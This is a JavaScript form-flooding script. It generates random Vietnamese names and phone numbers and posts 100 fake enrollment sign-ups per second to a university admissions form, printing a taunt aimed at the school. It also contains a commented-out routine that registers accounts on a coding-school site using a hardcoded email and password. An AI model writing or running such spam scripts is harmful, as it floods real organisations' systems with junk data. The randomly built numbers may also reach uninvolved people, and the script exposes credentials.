// value
var ho = ["Nguyễn ", "Trần ", "Lê ", "Phạm ", "Hoàng ", "Huỳnh ", "Phan ", "Vũ ", "Võ ", "Đặng ", "Bùi ", "Đỗ ", "Hồ ", "Ngô ", "Dương ", "Lý "];
var ten = ["Vân", "Thị Lan", "Thị Anh", "Thị Quỳnh", "Ngọc Vy", "Đức Thành",
    "Văn Thành", "Kiều Trang", "Văn Hoàng", "Như Quỳnh", "Huy Hoàng", "Oanh", "Văn Hoàng", "Duy Kiên", "Nhung", "Xuân Phước",
    "Văn Quyền", "Huấn", "Nga", "Thị Mai", "Loan", "Phương Mai", "Bảo", "Ngọc Bích",
    "Văn Khanh", "Duy Khanh", "Thị Khuyên", "Ngọc Khánh", "Văn Khánh", "Hải Châu", "Huyền", "Châu", "Hải Châu", "Chiến", "Minh Chiến", "Dũng", "Văn Quân", "Văn Phúc", "Ðức", "Văn Hiển", "Xuân Khiển", 'Hào', "Ðăng",
    "Văn Hải", "Thị Ngọc", "Linh Giang", "Hoài", "Thị Hà", "Văn Hà", "Xuân Hương", "Hợp",
    "Thị Hương", "Thị Trang", "Duy Tuyền", "Văn Sơn", "Huy", "Xuân Thủy", "Hùng", "Tùng", "Lộc", "Mạnh", "Huệ", "Phượng", "Thăng", "Thắng", "Minh Đạt", "Văn Tuấn", "Trịnh", "Hồng Thủy", "Thanh Nga", "Thanh Thảo", "Thảo Minh", "Hùng Việt",
    "Cao", "Duyên", "Thu", "Thị Hằng", "Trần Mạnh", "Đạt Danh", "Vinh", "Văn Lợi"
];
var dauso = ["03", "09", "08"];



function randomso(min, max) {
    return Math.floor(Math.random() * (max - min)) + min;
}
function tuyensinhukb() {
    setInterval(function() {
        for (var i = 0; i < 100; i++) {
            var hoten = (ho[Math.floor(Math.random() * ho.length)] + ten[Math.floor(Math.random() * ten.length)]).toString();
            var sdt = dauso[Math.floor(Math.random() * dauso.length)] + randomso(12345618, 99899978).toString();
            var khoa = ["Quản trị dịch vụ du lịch và lữ hành",
                "Quản trị kinh doanh ",
                "Luật kinh tế ",
                "Ngôn ngữ Anh ",
                "Công nghệ thông tin ",
                "Kế toán",
                "Tài chính – Ngân hàng",
                "Công nghệ kỹ thuật điện tử – viễn thông",
                "Thiết kế đồ họa",
                "Thiết kế thời trang ",
                "Quản lý nhà nước ",
                "Quản lý xây dựng ",
                "Kiến trúc ",
                "Quản lý kinh tế",
                "Đào tạo trình độ Cử nhân",
                "Đào tạo trình độ Thạc sĩ"
            ];
            var rdkhoa = khoa[Math.floor(Math.random() * khoa.length)]
            $.post("https://api.form.ladipage.com/sendform", {
                    "form_config_id": "60c6fb98a65e92002c16c902",
                    "ladipage_id": "60b5e97beba2a30012e7a221",
                    "tracking_form": [{
                            "name": "url_page",
                            "value": "http://dk.kinhbac.daotaodh.edu.vn/"
                        },
                        { "name": "utm_source", "value": "" },
                        { "name": "utm_medium", "value": "" },
                        { "name": "utm_campaign", "value": "" },
                        { "name": "utm_term", "value": "" },
                        { "name": "utm_content", "value": "" },
                        { "name": "variant_url", "value": "" },
                        { "name": "variant_content", "value": "" }
                    ],
                    "form_data": [{ "name": "name", "value": hoten },
                        { "name": "phone", "value": sdt },
                        {
                            "name": "form_item695",
                            "value": rdkhoa
                        }
                    ],
                    "data_key": null,
                    "status_send": 2,
                    "total_revenue": 0,
                    "time_zone": 7
                },
                function(data, status) {
                    document.writeln("ĐÃ VẢ VỠ MỒM UKB");
                }
                );
        }
    }, 1000);
}
function codegym() {
    // setInterval(function() {
    //     for (var i = 0; i < 100; i++) {
            var hoten = (ho[Math.floor(Math.random() * ho.length)] + ten[Math.floor(Math.random() * ten.length)]).toString();
            var sdt = dauso[Math.floor(Math.random() * dauso.length)] + randomso(12345618, 99899978).toString();
            var khoa = ["Quản trị dịch vụ du lịch và lữ hành",
                "Quản trị kinh doanh ",
                "Luật kinh tế ",
                "Ngôn ngữ Anh ",
                "Công nghệ thông tin ",
                "Kế toán",
                "Tài chính – Ngân hàng",
                "Công nghệ kỹ thuật điện tử – viễn thông",
                "Thiết kế đồ họa",
                "Thiết kế thời trang ",
                "Quản lý nhà nước ",
                "Quản lý xây dựng ",
                "Kiến trúc ",
                "Quản lý kinh tế",
                "Đào tạo trình độ Cử nhân",
                "Đào tạo trình độ Thạc sĩ"
            ];
            var rdkhoa = khoa[Math.floor(Math.random() * khoa.length)]
            $.post("https://learn.codegym.vn/register/", {
                "signup_email": "ledangtu0703@gmail.com",
                "signup_password": "ngomaia",
                "signup_password_confirm": "ngomaia",
                "field_1": "mai",
                "field_2": "ngo",
                "field_3": "ledangtu200111",
                "field_4": "",
                "signup_profile_field_ids": "1,2,3,4",
                "signup_submit": "Create Account",
                "_wpnonce": "20760dfa78",
                "_wp_http_referer": "/register/"
                },
                /*function(data, status) {
                    // document.writeln("ĐÃ ĐẶT HÀNG THÀNH CÔNG");
                    // document.writeln("*");
                }*/
                );
    //     }
    // }, 2000);
}
$(document).ready(function() {
    $("button").click(function() {
        tuyensinhukb();
        // codegym();
    });
});
